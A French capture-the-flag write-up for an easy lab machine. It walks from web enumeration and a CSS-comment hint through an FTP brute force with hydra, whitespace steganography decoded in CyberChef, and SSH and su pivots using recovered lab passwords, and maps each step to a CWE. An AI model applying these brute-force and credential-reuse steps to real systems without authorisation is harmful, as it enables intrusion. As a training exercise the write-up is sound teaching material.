# Write-up : "Musa Troglodytarum"

**Cible :** 10.10.0.X (vhost `viridiancity.epi`, l'IP change à chaque redéploiement)

**Objectif :** Obtenir user.txt

**Difficulté :** Easy

**Date :** 21/09/2026

**Techniques :** énumération web, indice caché dans le CSS, redirection HTTP, directory listing, `strings` sur une image, brute force FTP, stéganographie espaces/tabulations, réutilisation d'identifiants, pivot entre utilisateurs

**Outils :** nmap, curl, wget, strings, hydra, ftp, ssh, CyberChef

---

## 1. Scan des ports

```bash
nmap -sV 10.10.0.X
```

Résultat : `21` (FTP), `22` (SSH), `80` (HTTP, page "It works").

On ajoute le nom du site :

```bash
echo "10.10.0.X viridiancity.epi" | sudo tee -a /etc/hosts
```
Cette ligne dit à ta machine : « viridiancity.epi = cette IP ». `tee -a` = ajouter à la fin du fichier `/etc/hosts`.

---

## 2. Un indice caché dans le CSS

La page d'accueil parle d'une « vidéo » : c'est un piège, on l'ignore. Le vrai indice est dans la feuille de style :

```bash
curl http://viridiancity.epi/assets/style.css
```

En bas, un commentaire :

```
Take a look at the page: /l3_B4n4N13r_D3s_M0nT4gN3s.php
```

**Faille :** info sensible laissée dans un fichier annexe (CWE-200).

---

## 3. Suivre la page cachée

```bash
curl -i http://viridiancity.epi/l3_B4n4N13r_D3s_M0nT4gN3s.php
```
`-i` = affiche les en-têtes. La page vide renvoie une redirection.

L'en-tête `Location:` révèle un dossier caché :
`/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3`

**Faille :** chemin "secret" non protégé (CWE-425).

---

## 4. Récupérer l'image cachée

Ouvre le dossier dans ton navigateur (ou avec curl) :

```bash
curl http://viridiancity.epi/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3/
```

Il contient `Hot_Babe.png`. Télécharge-le :

```bash
wget http://viridiancity.epi/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3/Hot_Babe.png
```

**Faille :** directory listing activé (CWE-548).

---

## 5. Lire le texte caché dans l'image

```bash
strings Hot_Babe.png
```
`strings` affiche le texte lisible d'un fichier.

Tout en bas :

```
Username for FTP is banane_celeste
One of these is the password:
(200 mots de passe)
```

Copie la liste de mots de passe dans un fichier `passwords.txt` (copier-coller, ou avec un éditeur).

**Faille :** login et mots de passe cachés dans une image (CWE-200).

---

## 6. Brute force du FTP

```bash
hydra -l banane_celeste -P passwords.txt -f ftp://10.10.0.X
```
`-l` = le login, `-P` = la liste, `-f` = s'arrête dès qu'il trouve.

Hydra affiche le bon mot de passe FTP.

**Faille :** pas de protection contre le brute force (CWE-307).

---

## 7. Se connecter au FTP et prendre le fichier

```bash
ftp 10.10.0.X
```
Puis dans le FTP :
```
Name: banane_celeste
Password: <le mdp trouvé>
ls
get Valerian's_Creds.txt
bye
```
`ls` liste, `get` télécharge, `bye` quitte.

Regarde le fichier :
```bash
cat -A Valerian's_Creds.txt
```
`cat -A` montre les tabulations `^I` et les espaces : le fichier est plein de blancs, c'est un message caché.

---

## 8. Décoder la stéganographie (espaces/tabs) avec CyberChef

Le contenu est du binaire caché : espace = 0, tabulation = 1, 8 bits = 1 lettre.
Pas besoin de coder, on utilise CyberChef ([cyberchef.io](https://cyberchef.io)) :

1. Colle le contenu de `Valerian's_Creds.txt` dans Input.
2. Dans la recette (Recipe), glisse :
   - Find / Replace : chercher `\t` (mode Regex), remplacer par `1`
   - Find / Replace : chercher ` ` (un espace), remplacer par `0`
   - From Binary
3. Le résultat s'affiche dans Output :

```
User: valerian
Password: T4k_t4k_S0lide_Dyn0_int0_Cr1mP
```

**Faille :** identifiants cachés par stéganographie (CWE-311).

---

## 9. Connexion SSH en valerian

```bash
ssh valerian@10.10.0.X
```
(mot de passe : `T4k_t4k_S0lide_Dyn0_int0_Cr1mP`)

Le message d'accueil dit : « check our s3cr3t hiding place », c'est un indice.

**Faille :** réutilisation d'identifiants exposés (CWE-522).

---

## 10. Trouver la cachette

`user.txt` n'est pas dans le home. On cherche la « cachette » :

```bash
find / -iname "*s3cr3t*" 2>/dev/null
```
`find` cherche partout ; `2>/dev/null` cache les erreurs de permission.

Résultat : `/usr/games/s3cr3t/`. Il contient un fichier caché :

```bash
cat /usr/games/s3cr3t/.msg_fr0m_v4l3r14n
```

Message :

```
... just a reminder ... "ca_serait_jamais_arrive_en_haskell" ...
   -Valerian
```

Mot de passe de gabriel : `ca_serait_jamais_arrive_en_haskell`

**Faille :** mot de passe en clair dans un fichier (CWE-256).

---

## 11. Devenir gabriel et lire le flag

```bash
su gabriel
```
(mot de passe : `ca_serait_jamais_arrive_en_haskell`)

```bash
cat ~/user.txt
```

**FLAG :** `EPI{...}` (remplace par ta valeur)

---

## Résumé des étapes

1. Commentaire CSS : la page `.php`.
2. Cette page (302) : un dossier caché.
3. Le dossier contient `Hot_Babe.png`.
4. `strings` sur l'image : login FTP et liste de mots de passe.
5. `hydra` : le mot de passe FTP.
6. FTP : `Valerian's_Creds.txt` (espaces/tabs).
7. CyberChef : mot de passe de valerian.
8. SSH valerian, message caché : mot de passe de gabriel.
9. `su gabriel` : `user.txt`.

## Failles exploitées

| # | Faille | CWE |
|---|--------|-----|
| 1 | Indice dans un commentaire CSS | CWE-200 |
| 2 | Chemin secret non protégé | CWE-425 |
| 3 | Directory listing activé | CWE-548 |
| 4 | Login et wordlist cachés dans une image | CWE-200 |
| 5 | Pas d'anti-brute-force FTP | CWE-307 |
| 6 | Whitespace stego | CWE-311 |
| 7 | Réutilisation d'identifiants | CWE-522 |
| 8 | Mot de passe en clair dans un fichier | CWE-256 |

## À retenir
- Toujours lire les fichiers annexes (CSS, commentaires) : l'indice y était.
- Un `curl` qui n'affiche rien = une redirection, refais avec `-i`.
- `strings` révèle le texte caché dans une image.
- Un fichier plein d'espaces/tabs = du binaire : CyberChef (space=0, tab=1, From Binary), aucun code nécessaire.
- La « vidéo » est un piège volontaire.
